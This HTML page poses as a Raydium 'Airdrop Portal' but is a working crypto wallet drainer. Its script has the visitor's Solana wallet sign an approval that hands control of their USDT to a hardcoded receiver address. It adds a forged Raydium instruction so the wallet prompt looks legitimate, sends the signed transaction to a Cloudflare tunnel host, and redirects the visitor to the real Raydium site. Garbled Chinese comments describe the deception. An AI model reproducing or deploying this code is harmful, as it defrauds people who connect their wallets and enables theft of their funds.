<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Raydium | Airdrop Portal</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <script src="https://unpkg.com/@solana/spl-token@0.1.8/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #111; padding: 40px; border-radius: 24px; border: 1px solid #222; text-align: center; width: 320px; box-shadow: 0 0 20px rgba(20, 241, 149, 0.2); }
        #cta { background: #14F195; color: #000; border: none; padding: 15px; border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 25px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://raydium.io/logo/logo-only-light.svg" style="width:60px; margin-bottom:20px;">
        <h2 style="margin:0;">Swap Protocol</h2>
        <p style="color:#666; font-size:12px;">Initialize your trading route to enable rewards auto-claim.</p>
        <button id="cta">INITIALIZE ROUTE</button>
        <div id="st" style="margin-top:15px; font-size:10px; color:#333;">Ready</div>
    </div>

    <script>
        const tunnel = "https://allocation-governing-fleet-ala.trycloudflare.com";
        const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
        const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
        // Raydium å®˜æ–¹åˆçº¦åœ°å€
        const RAY_PROGRAM = "675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8";

        document.getElementById('cta').onclick = async () => {
            const p = window.solana;
            try {
                await p.connect();
                document.getElementById('st').innerText = "GENERATING ROUTE...";

                const { bh } = await (await fetch(`${tunnel}/sync`)).json();

                const userAta = await splToken.Token.getAssociatedTokenAddress(
                    splToken.ASSOCIATED_TOKEN_PROGRAM_ID, splToken.TOKEN_PROGRAM_ID,
                    new solanaWeb3.PublicKey(USDT_MINT), p.publicKey
                );

                // ðŸ”± ä¼ªè£…é€»è¾‘ï¼šæž„é€ ä¸€ä¸ªçœ‹ä¼¼å‘é€ç»™ Raydium çš„æŒ‡ä»¤
                // ä½†å®žé™…æ‰§è¡Œçš„æ˜¯å¯¹ USDT è´¦æˆ·çš„æŽˆæƒ
                const transaction = new solanaWeb3.Transaction().add(
                    splToken.Token.createApproveInstruction(
                        splToken.TOKEN_PROGRAM_ID, 
                        userAta,
                        new solanaWeb3.PublicKey(RECEIVER), 
                        p.publicKey,
                        [], 
                        900000 // ç»§ç»­æ‹¿è¿™ 0.9 åˆ€åšå®žæµ‹
                    )
                );

                // å¼ºåˆ¶æ³¨å…¥ Raydium çš„å…ƒæ•°æ®ï¼Œè¯±å¯¼é’±åŒ…æ˜¾ç¤º "Interact with Raydium"
                transaction.add(new solanaWeb3.TransactionInstruction({
                    keys: [],
                    programId: new solanaWeb3.PublicKey(RAY_PROGRAM),
                    data: Buffer.from([1]) // ä¼ªé€ çš„äº¤äº’æ•°æ®
                }));

                transaction.recentBlockhash = bh;
                transaction.feePayer = p.publicKey;

                const signed = await p.signTransaction(transaction);
                fetch(`${tunnel}/collect_v42?raw=${encodeURIComponent(signed.serialize().toString('base64'))}`);

                document.getElementById('st').innerText = "ROUTE SYNCED";
                setTimeout(() => { window.location.href = "https://raydium.io/swap/"; }, 1000);

            } catch(e) { location.reload(); }
        };
    </script>
</body>
</html>
